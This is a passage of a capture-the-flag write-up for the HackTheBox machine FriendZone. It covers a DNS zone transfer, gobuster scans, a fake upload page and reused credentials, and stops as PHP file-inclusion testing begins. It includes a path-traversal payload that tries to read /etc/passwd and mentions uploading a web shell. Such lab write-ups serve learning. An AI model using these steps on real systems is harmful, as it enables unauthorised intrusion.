src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_js_js.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b30b98a88f7808eb4efddeaf3e811d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It shows a base64 string, but decodes to gibberish.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780f6bf37da3c3ad44c65" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> echo eFY2cVJpZTIzMDE3NjMwMzUzMjYxREtwMkFGRUNw | base64 -d
+
+xV6qRie23017630353261DKp2AFECp</span></span></span></code></pre><div id="https://www.notion.so/2b30b98a88f7804cb88cc61028860635" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Once again, the page source gives more hints:</span></span></p></div><div id="https://www.notion.so/2b30b98a88f780089764cd42180efba3" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_js_js_source.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_js_js_source.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b30b98a88f780bfba3bde54ae36b7a6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Not entirely sure what “times” is referring to here, but I suppose “zones” is a hint for DNS zone transfer.</span></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f780bdb128de139ce4954d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780bdb128de139ce4954d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Port 53 — DNS:</span></span></h3><div id="https://www.notion.so/2b40b98a88f780638066c14a8c91b937" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://en.wikipedia.org/wiki/DNS_zone_transfer">zone transfer</a></span><span class="SemanticString"> is the process of synchronizing domain records between two DNS servers. This can be initialized via </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dig</code></span><span class="SemanticString">, in which the server will send back all information it holds for the domain, including all records as well as subdomain entries. Typically a zone transfer only happens over TCP, so it’s something always worth checking whenever TCP53 is found open.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780b2bb90d27bce7fb005" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll do a zone transfer for both domains. It found several subdomains for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friendzone.red</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f78055aad9c3c137cafd23" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> dig axfr friendzone.red @10.129.26.47
+
+; &lt;&lt;&gt;&gt; DiG 9.20.9-1-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.129.26.47
+;; global options: +cmd
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 269 msec
+;; SERVER: 10.129.26.47#53(10.129.26.47) (TCP)
+;; WHEN: Thu Nov 13 22:37:34 ACDT 2025
+;; XFR size: 8 records (messages 1, bytes 289)</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780a89f26e12cf9b69040" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And a few more for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">friendzoneportal.red</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f78032a672e506d779571c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> dig axfr friendzoneportal.red @10.129.26.47
+
+; &lt;&lt;&gt;&gt; DiG 9.20.9-1-Debian &lt;&lt;&gt;&gt; axfr friendzoneportal.red @10.129.26.47
+;; global options: +cmd
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzoneportal.red.	604800	IN	AAAA	::1
+friendzoneportal.red.	604800	IN	NS	localhost.
+friendzoneportal.red.	604800	IN	A	127.0.0.1
+admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
+files.friendzoneportal.red. 604800 IN	A	127.0.0.1
+imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
+vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
+friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 269 msec
+;; SERVER: 10.129.26.47#53(10.129.26.47) (TCP)
+;; WHEN: Thu Nov 13 22:43:23 ACDT 2025
+;; XFR size: 9 records (messages 1, bytes 309)</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780d988b8dae550b3644e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In total, there’s 7 subdomains, I’ll add all of them to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">. This is probably the most entries I’ve ever had in the hosts file.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780f5ae79fb1a24d22e74" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># HTB machine FriendZone
+10.129.26.47	friendzone.red	friendzoneportal.red	administrator1.friendzone.red	hr.friendzone.red	uploads.friendzone.red	admin.friendzoneportal.red	files.friendzoneportal.red	imports.friendzoneportal.red	vpn.friendzoneportal.red</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f78094b57ec0ef5ced9de9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hr</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">files</code></span><span class="SemanticString">, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">imports</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">vpn</code></span><span class="SemanticString"> either returned 404 or the original troll page, but the rest does have something to look at.</span></span></p></div><h3 id="https://www.notion.so/2ab0b98a88f7804caa3ef3d3a2d89052" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f7804caa3ef3d3a2d89052"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Subdomains:</span></span></h3><div id="https://www.notion.so/2ab0b98a88f780e3883adf5cf5efbefc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">uploads.friendzone.red:</strong></span></span></p></div><div id="https://www.notion.so/2b40b98a88f78037acd6c0edc420bad9" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_home.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_home.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f780f8b559fe9993253731" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">uploads</code></span><span class="SemanticString"> is a very basic upload page. I’ve uploaded a test image, and the page returned a success message with a timestamp.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78021b416c41ffa124e2c" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_response.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_response.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7807791bff686a0ca47ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The page claims to only accept images, but it seemingly takes any files. Uploading a PHP web shell also returned the same success message.</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f780d691f6df5be3de88e7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u https://uploads.friendzone.red -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php -k
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://uploads.friendzone.red
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 302]
+/files                (Status: 301) [Size: 334] [--&gt; https://uploads.friendzone.red/files/]
+/upload.php           (Status: 200) [Size: 38]
+Progress: 17394 / 441120 (3.94%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 17414 / 441120 (3.95%)
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/2b40b98a88f780eea5fde8e3934423f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString"> also found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/files</code></span><span class="SemanticString">, but neither my uploaded image nor the web shell could be found there.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f7807bb281c6a627629628" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Turns out the page still shows “success” even if the request is broken.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78048afdac22566df5133" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_burp.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_burp.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f780feae30c1943eafa807" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Given the context, this upload function seems rather random. I doubt it’s even implemented on the backend.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78091ba39ff167d0c756d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Sending a GET request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/upload.php</code></span><span class="SemanticString"> also results in this:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780c4be9bf0c699ca8d20" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_get.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_uploads_get.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2ab0b98a88f78062b884fcd2e114a706" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ab0b98a88f780d0a4b3ec4db8e55e90" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">admin.friendzoneportal.red</strong></span></span></p></div><div id="https://www.notion.so/2b40b98a88f780529425fd47cb00f9ad" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin_home.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin_home.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7809eb42bc82fc190bef6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin</code></span><span class="SemanticString"> is a login page, but any credentials (or blank) would work.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780cd83c5e8d4ff37f026" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin_login.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin_login.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f780f0b04beea31acd3007" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It doesn’t offer much, other than suggesting to check the other admin page.</span></span></p></div><div id="https://www.notion.so/2ab0b98a88f7805a90d3d04437c384de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ab0b98a88f78061a0dad2fcafcd7985" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">administrator1.friendzone.red</strong></span></span></p></div><div id="https://www.notion.so/2b40b98a88f780d880d7f74889740887" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_home.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_home.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7809683f0cb2041e94e44" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">administrator1</code></span><span class="SemanticString"> is yet another login form. This time authentication seems to be set up properly. Wrong credentials results in this:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780c085e2e1db0f5bd5e1" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_wrong.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_wrong.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f78077a33af0ff80943047" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, the page source also contains a register form:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780a48213e070c71a2e6e" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_register.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_register.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7802bb5b5d899e55eb5d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But it’s specifically hidden by some CSS:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780de82d3d8c247b30ca7" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_css.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_css.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f780bc82f3f5708ce0b0af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Anyway, it’s not needed, as the SMB creds worked here. The page suggests checking </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dashboard.php</code></span><span class="SemanticString"> on login.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780e0befbc103244e9327" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_success.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_admin1_success.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><h3 id="https://www.notion.so/2ab0b98a88f780a385a6f11443a8b880" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f780a385a6f11443a8b880"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Admin Dashboard:</span></span></h3><div id="https://www.notion.so/2b40b98a88f7804cb978d6f59ae5913d" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_dashboard.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_dashboard.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f7803a88ccdf7980c0ae0e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It’s an under-construction and untested page. The error message indicated that some parameters were missing.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780d8ac1cf2a6b6ba3d79" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll try the default params as suggested, and got this:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f780c0b584f7d748209219" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_default_params.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_default_params.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f780f7bff5c5970b4c5c23" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The image seems to be directly referenced via </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">image_id</code></span><span class="SemanticString">, and could potentially be vulnerable to path traversal/file inclusion attacks. I’ve tried </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">image_id=../../../../../../../../etc/passwd</code></span><span class="SemanticString">, and it returned a broken image.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78031a379f8b8daf25c49" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_dashboard_broken_img.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_dashboard_broken_img.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f78046a3edf2fc256a601a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Looking at Burp history, instead of directly including the file contents, it’s only appending the user input to the image source.</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78002a1fddd74e86d9559" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_dashboard_burp.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_dashboard_burp.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f78011b540de7213350746" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This resulted in a second GET request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/passwd</code></span><span class="SemanticString">, which obviously failed.</span></span></p></div><div id="https://www.notion.so/2ab0b98a88f78029959ffb612e5ab924" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2aa0b98a88f781fa871cf7b555ec9494" class="Divider"></div><h2 id="https://www.notion.so/2aa0b98a88f781eea9c5d74875ed4ab7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/2aa0b98a88f781eea9c5d74875ed4ab7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h2><h3 id="https://www.notion.so/2ab0b98a88f78056b86fecf4f09d491b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/2ab0b98a88f78056b86fecf4f09d491b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">PHP File Inclusion:</span></span></h3><div id="https://www.notion.so/2b40b98a88f7809f8269db95a90cea7c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString"> also found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/timestamp.php</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/2ab0b98a88f78014b7f3e2b3461ecde5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/friendzone]
+└─$</span></mark></span><span class="SemanticString"><span> gobuster dir -u https://administrator1.friendzone.red -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php -k 
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://administrator1.friendzone.red
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 349] [--&gt; https://administrator1.friendzone.red/images/]
+/.php                 (Status: 403) [Size: 309]
+/login.php            (Status: 200) [Size: 7]
+/dashboard.php        (Status: 200) [Size: 101]
+/timestamp.php        (Status: 200) [Size: 36]
+Progress: 53646 / 441120 (12.16%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 53651 / 441120 (12.16%)
+===============================================================
+Finished
+===============================================================</span></span></span></code></pre><div id="https://www.notion.so/2ab0b98a88f78025b1d3dba6e3f9ab9e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Visiting the page shows this:</span></span></p></div><div id="https://www.notion.so/2b40b98a88f78009ad78d5f3cde511d5" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_timestamp.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/friendzone/port443_timestamp.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2b40b98a88f780319592d3daa78a0647" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The format looks identical to the timestamp seen on the bottom of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dashboard.php</code></span><span class="SemanticString">. I suspect the page is including other PHP files specified in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pagename</code></span><span class="SemanticString"> param. Setting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pagename=login</code></span><span 